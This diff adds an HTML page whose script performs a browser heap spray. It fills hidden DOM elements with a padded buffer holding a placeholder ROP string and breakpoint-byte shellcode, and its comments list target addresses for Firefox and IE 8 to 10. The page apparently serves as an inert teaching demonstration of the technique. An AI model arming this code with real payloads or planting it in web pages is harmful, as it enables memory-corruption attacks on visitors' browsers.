@@ -1,0 +1,31 @@
+<html>
+<head></head>
+<body>
+<div id="blah"></div>
+<script language = 'javascript'>
+        var div_container = document.getElementById("blah");
+        div_container.style.cssText = "display:none";
+        var data;
+        offset = 0x104;
+        junk = unescape("%u2020%u2020");
+        while (junk.length < 0x800) junk += junk;
+        
+        rop = unescape("%u5247%u5941%u4148%u5F54%u4148%u4B43%u4E49%u5F47%u5434%u2148");
+        shellcode = unescape("%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc");
+        data = junk.substring(0,offset) + rop + shellcode;
+        data += junk.substring(0,0x800-offset-rop.length-shellcode.length);
+        while (data.length < 0x80000) data += data;
+        // Targets: 
+        // FireFox : 0x20302210
+        // IE 8, 9 and 10 : 0x20302228  
+        for (var i = 0; i < 0x250; i++)
+        {
+                var obj = document.createElement("acronym");
+                obj.title = data.substring(0,0x40000-0x58);
+                obj.style.fontFamily = data.substring(0,0x40000-0x58);
+                div_container.appendChild(obj);
+        }
+        alert("spray done");
+</script>
+</body>
+</html>
